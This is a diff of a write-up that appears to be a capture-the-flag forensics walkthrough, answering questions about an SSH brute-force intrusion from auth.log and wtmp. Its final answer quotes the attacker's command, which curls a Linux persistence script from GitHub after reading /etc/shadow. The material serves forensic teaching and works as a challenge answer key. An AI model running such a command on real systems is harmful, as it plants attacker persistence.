@@ -21,7 +21,7 @@ Analyze the auth.log. What is the IP address used by the attacker to carry out a
 
 #### Answer:
 Analyzing `auth.log` reveals a high volume of failed SSH connection attempts from IP address `65.2.161.68` within a very short timeframe.
-![image](ip.png)
+![image](image/ip.png)
 
 Answer: **65.2.161.68**
 
@@ -33,7 +33,7 @@ The bruteforce attempts were successful and attacker gained access to an account
 
 #### Answer:
 Scrolling through `auth.log`, after numerous failed attempts, an accepted password event was logged for user `root`.
-![image](root.png)
+![image](image/root.png)
 
 Answer: **root**
 
@@ -48,7 +48,7 @@ Using the provided Python script alongside `column -t` to parse and align the `w
 ```bash
 python3 utmp.py wtmp | column -t
 ```
-![image](wtmp.png)
+![image](image/wtmp.png)
 
 Answer: **2024-03-06 06:32:45**
 
@@ -71,7 +71,7 @@ The attacker added a new user as part of their persistence strategy on the serve
 
 #### Answer:
 After gaining initial access, the attacker created a new user named `cyberjunkie` and added this account to several privileged groups.
-![image](persistence.png)
+![image](image/persistence.png)
 
 Answer: **cyberjunkie**
 
@@ -94,7 +94,7 @@ What time did the attacker's first SSH session end according to auth.log?
 
 #### Answer:
 The session close event (`session closed for user root`) for the initial SSH session is recorded in `auth.log`.
-![image](logout.png)
+![image](image/logout.png)
 
 Answer: **2024-03-06 06:37:24**
 
@@ -106,6 +106,6 @@ The attacker logged into their backdoor account and utilized their higher privil
 
 #### Answer:
 After logging into the backdoor account, the attacker leveraged `sudo` to inspect `/etc/shadow` and download a remote persistence script.
-![image](command.png)
+![image](image/command.png)
 
 Answer: **/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh**
